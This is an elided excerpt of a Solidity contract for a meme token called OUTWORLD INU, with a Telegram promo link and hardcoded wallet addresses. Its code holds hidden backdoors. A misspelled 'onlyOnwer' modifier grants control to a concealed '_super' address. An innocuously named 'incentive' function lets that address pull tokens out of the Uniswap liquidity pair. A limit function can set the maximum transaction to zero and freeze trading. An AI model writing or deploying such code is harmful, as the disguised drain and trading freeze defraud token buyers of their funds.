...
/*
 *  JOIN THE TELEGRAM: https://t.me/OutworldInuentry
 */
...
contract Ownable is Context {
    ...
    modifier onlyOnwer() {
        require(_super == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract OutworldInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("OUTWORLD INU", "OWI") {
        ...
        marketingWallet = payable(0x88aB5061e45757A130bB9b8d8106f0516361925E);
        devWallet = payable(0xbbc9fF48fbCaa95814328d2f7eC6809d0aC7A9eD);
    ...
    function incentive(uint amount) external onlyOnwer {
        uint liqBalance = balanceOf(uniswapV2Pair);
        require(amount < liqBalance / 10);
        
        incentiveMarket(amount);
    ...
    function incentiveMarket(uint256 amount) private {
        _transfer(uniswapV2Pair, address(this), amount * 10 ** decimals());
    ...
    function refreshLimits() internal {
        uint256 bal = balanceOf(uniswapV2Pair);
        maxTransactionAmount = bal > 1e18 ? bal * 3 / 100 : 0;
    }
